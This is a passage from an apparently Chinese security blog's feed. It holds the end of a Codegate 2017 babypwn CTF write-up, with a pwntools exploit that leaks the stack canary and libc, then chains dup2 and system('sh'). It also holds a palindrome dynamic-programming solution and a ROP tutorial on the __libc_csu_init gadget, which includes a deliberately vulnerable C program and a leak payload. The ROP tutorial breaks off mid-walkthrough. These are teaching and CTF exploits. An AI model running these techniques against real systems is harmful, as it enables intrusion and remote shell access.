class="string">"sh\x00"</span>))</div><div class="line">setsockopt_loclibc_addr = libc.symbols[<span class="string">'setsockopt'</span>]</div><div class="line">dup2_loclibc_addr = libc.symbols[<span class="string">'dup2'</span>]</div><div class="line"></div><div class="line">pop_ret_addr = <span class="number">0x08048b85</span></div><div class="line">pop_pop_ret_addr = <span class="number">0x08048b84</span></div><div class="line">vuln_func_addr = <span class="number">0x8048A71</span></div><div class="line">system_sym_addr = elf.symbols[<span class="string">"system"</span>]</div><div class="line">send_sym_addr = elf.symbols[<span class="string">'send'</span>]</div><div class="line">setsockopt_got_addr = elf.got[<span class="string">'setsockopt'</span>]</div><div class="line"></div><div class="line">offset_sh_setsockopt = sh_loclibc_addr - setsockopt_loclibc_addr</div><div class="line">offset_dup2_setsockopt = dup2_loclibc_addr - setsockopt_loclibc_addr</div><div class="line"></div><div class="line">log.success(<span class="string">"system symbols address is : "</span> + hex(system_sym_addr))</div><div class="line">log.success(<span class="string">"send address is : "</span> + hex(send_sym_addr))</div><div class="line">log.info(<span class="string">"First Stage : Leak canary value.\n"</span>)</div><div class="line">r.recvuntil(<span class="string">"Select menu &gt; "</span>)</div><div class="line">payload = <span class="string">"1"</span></div><div class="line">r.sendline(payload)</div><div class="line">r.recvuntil(<span class="string">"Input Your Message : "</span>)</div><div class="line">payload = <span class="string">'b'</span> * <span class="number">0x28</span></div><div class="line">r.sendline(payload)</div><div class="line">canary_value = u32(<span class="string">'\x00'</span> + r.recv()[<span class="number">0x29</span>:<span class="number">0x2c</span>])</div><div class="line">log.info(<span class="string">"Canary : %s "</span> % hex(canary_value))</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Select menu &gt; "</span>)</div><div class="line">payload = <span class="string">"1"</span></div><div class="line">r.sendline(payload)</div><div class="line">r.recvuntil(<span class="string">"Input Your Message : "</span>)</div><div class="line">payload = <span class="string">'A'</span> * <span class="number">0x28</span>  </div><div class="line">payload += p32(canary_value)</div><div class="line">payload += <span class="string">'A'</span> * <span class="number">8</span> <span class="comment"># reach 0x28 + 4 + 8 = 52</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">4</span> <span class="comment"># reach ret</span></div><div class="line">payload += p32(send_sym_addr)</div><div class="line">payload += p32(vuln_func_addr)</div><div class="line">payload += p32(<span class="number">4</span>)</div><div class="line">payload += p32(setsockopt_got_addr)</div><div class="line">payload += p32(<span class="number">4</span>)</div><div class="line">payload += p32(<span class="number">0</span>)</div><div class="line">r.sendline(payload)</div><div class="line">r.recvuntil(<span class="string">"Select menu &gt; "</span>)</div><div class="line">payload = <span class="string">'3'</span></div><div class="line">r.sendline(payload)</div><div class="line">setsockopt_libc_addr = u32(r.recv(<span class="number">4</span>))</div><div class="line">log.success(<span class="string">"setsockopt libc addr is : "</span> + hex(setsockopt_libc_addr))</div><div class="line"></div><div class="line">sh_libc_addr = offset_sh_setsockopt + setsockopt_libc_addr</div><div class="line">dup2_libc_addr = offset_dup2_setsockopt + setsockopt_libc_addr</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Select menu &gt; "</span>)</div><div class="line">payload = <span class="string">"1"</span></div><div class="line">r.sendline(payload)</div><div class="line">r.recvuntil(<span class="string">"Input Your Message : "</span>)</div><div class="line">payload = <span class="string">'A'</span> * <span class="number">0x28</span>  </div><div class="line">payload += p32(canary_value)</div><div class="line">payload += <span class="string">'A'</span> * <span class="number">8</span> <span class="comment"># reach 0x28 + 4 + 8 = 52</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">4</span> <span class="comment"># reach ret</span></div><div class="line">payload += p32(dup2_libc_addr)</div><div class="line">payload += p32(pop_pop_ret_addr)</div><div class="line">payload += p32(<span class="number">4</span>)</div><div class="line">payload += p32(<span class="number">0</span>)</div><div class="line">payload += p32(dup2_libc_addr)</div><div class="line">payload += p32(pop_pop_ret_addr)</div><div class="line">payload += p32(<span class="number">4</span>)</div><div class="line">payload += p32(<span class="number">1</span>)</div><div class="line">payload += p32(system_sym_addr)</div><div class="line">payload += p32(<span class="number">0</span>)</div><div class="line">payload += p32(sh_libc_addr)</div><div class="line">r.sendline(payload)</div><div class="line">r.recvuntil(<span class="string">"Select menu &gt; "</span>)</div><div class="line">payload = <span class="string">'3'</span></div><div class="line">r.sendline(payload)</div><div class="line">r.recv()</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170812/tty.gif?raw=true" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Codegate 2017 Qual-babypwn-writeup&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:bin" scheme="http://yoursite.com/categories/writeup-bin/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
-    
-      <category term="栈溢出" scheme="http://yoursite.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>hihoCoder 162周：回文字符串</title>
-    <link href="http://yoursite.com/2017/08/12/hihoCoder-162%E5%91%A8%EF%BC%9A%E5%9B%9E%E6%96%87%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
-    <id>http://yoursite.com/2017/08/12/hihoCoder-162周：回文字符串/</id>
-    <published>2017-08-12T02:25:34.000Z</published>
-    <updated>2017-08-12T05:09:10.351Z</updated>
-    
-    <content type="html"><![CDATA[<p>回文字符串。动态规划。<br><a id="more"></a></p>
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>给定一个字符串 S ，最少需要几次增删改操作可以把 S 变成一个回文字符串？一次操作可以在任意位置插入一个字符，或者删除任意一个字符，或者把任意一个字符修改成任意其他字符。</p>
-<h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>字符串 S。S 的长度不超过100, 只包含’A’-‘Z’。</p>
-<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>最少的修改次数。</p>
-<h2 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h2><pre><code>ABAD
-</code></pre><h2 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h2><pre><code>1
-</code></pre><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这题采用动态规划。</p>
-<p>读入的字符串假设用s表示。则s[i..j]，表示从下标为i的字符到下标为j的字符所组成的字符子串（字符串下标从0开始），而s[i]表示下标为i的字符。例如，字符串“ABCD”，则s[0,2]表示字符串“ABC”，s[1]为字符“B”。</p>
-<p>用一个二维数组dp[i][j]来保存状态，其中对于每个dp[i][j]，表示对字符串s[i..j]，使之成为回文字符串所需的最少操作。</p>
-<p>现在考察子串s[i..j]。</p>
-<p>第一种情况，首尾恰好相同，即 s[i] == s[j]。则对于子串s[i..j]而言，它要变成回文字符串所需的最少操作，与子串s[i-1..j-1]变成回文字符串所需的最少操作数相同。所以有 dp[i][j] = dp[i-1][j+1]</p>
-<p>第二种情况，首尾不同，即 s[i] != s[j]。要想让子串s[i..j]变成回文字符串，我们可以利用题目提供的三种操作：增加，删除，修改。</p>
-<p>接下来我们分情况讨论。</p>
-<ol>
-<li><p>假设 s[i..j-1] 是回文字符串。则我们可以在s[i]之前添加上一个字符，使之匹配字符s[j]，从而让 s[i..j] 成为回文字符串。此时，dp[i][j] = dp[i][j-1] + 1。或者，我们直接删除掉字符s[j]，让 s[i..j] 变成s[i..j-1]，从而成为回文字符串，此时同样，dp[i][j] = dp[i][j-1] + 1</p>
-</li>
-<li><p>假设 s[i+1..j] 是回文字符串。则我们可以在s[j]之后添加一个字符，使之匹配字符s[i]，从而让 s[i..j] 成为回文字符串，此时，dp[i][j] = dp[i+1][j] + 1。或者，我们直接将字符s[i]删掉，让 s[i..j] 变成 s[i+1，j]，从而成为回文字符串，此时也有 dp[i][j] = dp[i+1][j] + 1。</p>
-</li>
-<li><p>假设 s[i-1..j-1] 是回文字符串。则我们可以修改s[i]，使之匹配s[j]，或者修改s[j]，使之匹配s[i]。这种情况下，有：d[i][j] = dp[i-1][j-1] + 1</p>
-</li>
-</ol>
-<p>以上三种情况，囊括了对字符串s[i..j]所能操作的所有情况。而为求最小操作数，只要取三种情况的最小值。</p>
-<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_N 1005</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">char</span> str[MAX_N];</div><div class="line"><span class="keyword">int</span> dp[MAX_N][MAX_N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min_dp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> temp = a&gt;b?b:a;</div><div class="line">    <span class="keyword">return</span> temp&gt;c?c:temp;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</div><div class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</div><div class="line"></div><div class="line">    <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="keyword">sizeof</span>(dp));</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=len<span class="number">-1</span> ;i&gt;=<span class="number">0</span> ;i--)&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=i ;j&lt;len ;j++)&#123;</div><div class="line">            <span class="keyword">if</span> ( str[i] == str[j])&#123;</div><div class="line">                dp[i][j] = dp[i+<span class="number">1</span>][j<span class="number">-1</span>];</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                dp[i][j] = min_dp(dp[i+<span class="number">1</span>][j],dp[i][j<span class="number">-1</span>],dp[i+<span class="number">1</span>][j<span class="number">-1</span>]) + <span class="number">1</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,dp[<span class="number">0</span>][len<span class="number">-1</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;回文字符串。动态规划。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="编程练习" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
-    
-    
-      <category term="编程练习" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
-    
-      <category term="hihoCoder" scheme="http://yoursite.com/tags/hihoCoder/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ROP学习：利用通用gadget</title>
-    <link href="http://yoursite.com/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/"/>
-    <id>http://yoursite.com/2017/08/09/ROP学习：利用通用gadget/</id>
-    <published>2017-08-09T11:19:20.000Z</published>
-    <updated>2017-08-09T16:56:29.845Z</updated>
-    
-    <content type="html"><![CDATA[<p>web狗的二进制之路。<br><a id="more"></a></p>
-<h1 id="通用Gadget"><a href="#通用Gadget" class="headerlink" title="通用Gadget"></a>通用Gadget</h1><p>在x64下进行pwn时，由于参数的传递是通过寄存器来传递的，所以需要寻找gadget。有时用一些工具比如ROPgadget，使用下面的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROPgadget ---binary bin --only &quot;pop|ret&quot;</div></pre></td></tr></table></figure></p>
-<p>来寻找gadget。但有时候找不到可用的gadget。</p>
-<p>但在x64的环境下，程序有调用libc.so的话，一般会有一个__libc_csu_init()函数。利用里面的gadget可以达到向函数进行传参的功能。这就是通用gadget。</p>
-<p>以蒸米师傅的<a href="http://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.11b0b6ciOa8Kp&amp;articleid=473" target="_blank" rel="external">《一步一步学ROP之linux_x64篇》</a>为例研究一下。其源代码level5.c如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</div><div class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</div><div class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</div><div class="line">    vulnerable_function();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>用objdump查看，习惯intel语法了所以这里加了个 <code>-Mintel</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">objdump -d -Mintel level5</div></pre></td></tr></table></figure></p>
-<p>其中__libc_csu_init函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">00000000004005a0 &lt;__libc_csu_init&gt;:</div><div class="line">  4005a0:	48 89 6c 24 d8       	mov    QWORD PTR [rsp-0x28],rbp</div><div class="line">  4005a5:	4c 89 64 24 e0       	mov    QWORD PTR [rsp-0x20],r12</div><div class="line">  4005aa:	48 8d 2d 73 08 20 00 	lea    rbp,[rip+0x200873]        # 600e24 &lt;__init_array_end&gt;</div><div class="line">  4005b1:	4c 8d 25 6c 08 20 00 	lea    r12,[rip+0x20086c]        # 600e24 &lt;__init_array_end&gt;</div><div class="line">  4005b8:	4c 89 6c 24 e8       	mov    QWORD PTR [rsp-0x18],r13</div><div class="line">  4005bd:	4c 89 74 24 f0       	mov    QWORD PTR [rsp-0x10],r14</div><div class="line">  4005c2:	4c 89 7c 24 f8       	mov    QWORD PTR [rsp-0x8],r15</div><div class="line">  4005c7:	48 89 5c 24 d0       	mov    QWORD PTR [rsp-0x30],rbx</div><div class="line">  4005cc:	48 83 ec 38          	sub    rsp,0x38</div><div class="line">  4005d0:	4c 29 e5             	sub    rbp,r12</div><div class="line">  4005d3:	41 89 fd             	mov    r13d,edi</div><div class="line">  4005d6:	49 89 f6             	mov    r14,rsi</div><div class="line">  4005d9:	48 c1 fd 03          	sar    rbp,0x3</div><div class="line">  4005dd:	49 89 d7             	mov    r15,rdx</div><div class="line">  4005e0:	e8 1b fe ff ff       	call   400400 &lt;_init&gt;</div><div class="line">  4005e5:	48 85 ed             	test   rbp,rbp</div><div class="line">  4005e8:	74 1c                	je     400606 &lt;__libc_csu_init+0x66&gt;</div><div class="line">  4005ea:	31 db                	xor    ebx,ebx</div><div class="line">  4005ec:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]</div><div class="line">  4005f0:	4c 89 fa             	mov    rdx,r15</div><div class="line">  4005f3:	4c 89 f6             	mov    rsi,r14</div><div class="line">  4005f6:	44 89 ef             	mov    edi,r13d</div><div class="line">  4005f9:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]</div><div class="line">  4005fd:	48 83 c3 01          	add    rbx,0x1</div><div class="line">  400601:	48 39 eb             	cmp    rbx,rbp</div><div class="line">  400604:	75 ea                	jne    4005f0 &lt;__libc_csu_init+0x50&gt;</div><div class="line">  400606:	48 8b 5c 24 08       	mov    rbx,QWORD PTR [rsp+0x8]</div><div class="line">  40060b:	48 8b 6c 24 10       	mov    rbp,QWORD PTR [rsp+0x10]</div><div class="line">  400610:	4c 8b 64 24 18       	mov    r12,QWORD PTR [rsp+0x18]</div><div class="line">  400615:	4c 8b 6c 24 20       	mov    r13,QWORD PTR [rsp+0x20]</div><div class="line">  40061a:	4c 8b 74 24 28       	mov    r14,QWORD PTR [rsp+0x28]</div><div class="line">  40061f:	4c 8b 7c 24 30       	mov    r15,QWORD PTR [rsp+0x30]</div><div class="line">  400624:	48 83 c4 38          	add    rsp,0x38</div><div class="line">  400628:	c3                   	ret    </div><div class="line">  400629:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]</div></pre></td></tr></table></figure></p>
-<p>在<a href="http://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.11b0b6ciOa8Kp&amp;articleid=473" target="_blank" rel="external">《一步一步学ROP之linux_x64篇》</a>中，利用该通用gadget的思路如下：</p>
-<blockquote>
-<p>我们可以看到利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005f0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx<em>8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx</em>8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。</p>
-</blockquote>
-<p>不过具体是怎样的一个流程，可能光看这段话不太清楚。我们根据蒸米师傅的payload1来调试一下整个ROP的过程。</p>
-<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>蒸米师傅的第一个payload，是要利用write()输出在内存中的地址，即<code>write(1, write.got, 8)</code>。根据64位由寄存器传参，我们要利用rop做到以下几件事：</p>
-<ul>
-<li>设置<code>rdi</code>为<code>1</code>，这是第一个参数</li>
-<li>设置<code>rsi</code>为 write的got地址即write.got，这是第二个参数</li>
-<li>设置<code>rdx</code>为 8，这是第三个参数</li>
-<li>成功的调用write()函数</li>
-</ul>
-<p>现在利用脚本具体如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">elf = ELF(<span class="string">'level5'</span>)</div><div class="line">p = process(<span class="string">'./level5'</span>)</div><div class="line">log.info(proc.pidof(p)[<span class="number">0</span>])</div><div class="line">got_write = elf.got[<span class="string">'write'</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">"got_write: "</span> + hex(got_write)</div><div class="line">got_read = elf.got[<span class="string">'read'</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">"got_read: "</span> + hex(got_read)</div><div class="line">main = <span class="number">0x400564</span></div><div class="line">payload1 =  <span class="string">"\x00"</span>*<span class="number">136</span></div><div class="line">payload1 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></div><div class="line">payload1 += p64(<span class="number">0x4005F0</span>) <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span></div><div class="line">payload1 += <span class="string">"\x00"</span>*<span class="number">56</span></div><div class="line">payload1 += p64(main)</div><div class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></div><div class="line">raw_input()</div><div class="line">p.send(payload1)</div><div class="line">raw_input()</div></pre></td></tr></table></figure></p>
-<p>其中log.info(proc.pidof(p)[0])用来输出process的pid，用于gdb的attach。第一个raw_input()是在发送payload之前attach上去，这样能具体的观察到发送前后内存的bain话，最后一行raw_input()是在发送payload后挂住脚本防止level5直接退出。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/1.png?raw=true" alt=""></p>
-<p>如图所示，进程的PID号为4597.用gdb命令<code>gdb attach 4597</code>后即可附加到进程上。在py脚本中按一下回车，这时会执行p.send(payload1)。接下来正式开始调试，以下命令均在gdb中进行。</p>
-<h2 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h2><p>接下来我们开始正式的第一阶段的ROP<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">payload1 =  &quot;\x00&quot;*136</div><div class="line">payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div></pre></td></tr></table></figure></p>
-<p>此时程序执行到read(STDIN_FILENO, buf, 512)，我们按<code>n</code>后，程序执行完read，将我们的payload读到了栈上。我们输入了136个<code>0</code>，然后是通用gadget的起始位置<code>0x400606</code>。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/2.png?raw=true" alt=""></p>
-<p>接下去继续输入<code>n</code>，当程序执行将到<code>0x400563 &lt;vulnerable_function+31&gt;:    ret</code>时，可以观察到此时栈顶为<code>0x400606</code>。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/3.png?raw=true" alt=""></p>
-<p>继续输入<code>n</code>，程序跳到通用gadget里，开始正式的rop。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/4.png?raw=true" alt=""></p>
-<p>根据我们的payload：p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) + p64(0x4005F0)，结合上图的stack分析，可知此时的栈中数据分布如下（小端序）：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th style="text-align:center">起点</th>
-<th style="text-align:center">+0</th>
-<th style="text-align:center">+1</th>
-<th style="text-align:center">+2</th>
-<th style="text-align:center">+3</th>
-<th style="text-align:center">+4</th>
-<th style="text-align:center">+5</th>
-<th style="text-align:center">+6</th>
-<th style="text-align:center">+7</th>
-<th style="text-align:center">对应数据</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">rsp</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x0</td>
-</tr>
-<tr>
-<td style="text-align:center">rsp+8</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x0</td>
-</tr>
-<tr>
-<td style="text-align:center">rsp+16</td>
-<td style="text-align:center">01</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x1</td>
-</tr>
-<tr>
-<td style="text-align:center">rsp+24</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">10</td>
-<td style="text-align:center">60</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x601000</td>
-</tr>
-<tr>
-<td style="text-align:center">rsp+32</td>
-<td style="text-align:center">01</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x1</td>
-</tr>
-<tr>
-<td style="text-align:center">rsp+40</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">10</td>
-<td style="text-align:center">60</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x601000</td>
-</tr>
-<tr>
-<td style="text-align:center">rsp+48</td>
-<td style="text-align:center">08</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x8</td>
-</tr>
-<tr>
-<td style="text-align:center">rsp+56</td>
-<td style="text-align:center">f0</td>
-<td style="text-align:center">05</td>
-<td style="text-align:center">40</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">00</td>
-<td style="text-align:center">0x4005f0</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p>此时各寄存器的值如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/5.png?raw=true" alt=""></p>
-<p>我们继续按<code>n</code>，程序执行完<code>mov    rbx,QWORD PTR [rsp+0x8]</code>，将<code>rsp+0x8</code>也即<code>rsp+8</code>地址处的数据以QWORD形式即8字节赋值给rbx，执行完后，rbx将为0。所以这里有一点要注意的，我们的payload开头是这样的：p64(0) +p64(0) + p64(1) + ……，第一个p64(0)，是起一个padding的作用，用来填充rsp到rsp+0x7之间的数据的。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/6.png?raw=true" alt=""><br>（因为之前调用的read和write的第一个参数就是STDIN_FILENO，值为0，所以这里rbx原本就是0，所以可能感觉没啥变化，其实就是用0赋值给了一个原本就是0的rbx）</p>
-<p>接下去按<code>n</code>，执行<code>mov    rbp,QWORD PTR [rsp+0x10]</code>，将<code>rsp+0x10</code>也即<code>rsp+16</code>地址处的数据以QWORD形式即8字节赋值给rbp。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/7.png?raw=true" alt=""></p>
-<p>接下去一直按<code>n</code>，程序依次执行mov操作，直至<code>add    rsp,0x38</code>，此时寄存器情况如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/8.png?raw=true" alt=""></p>
-<p>几个重要的寄存器值列举如下：</p>
-<ul>
-<li>RBX: 0x0</li>
-<li>RBP: 0x1</li>
-<li>R12: 0x601000</li>
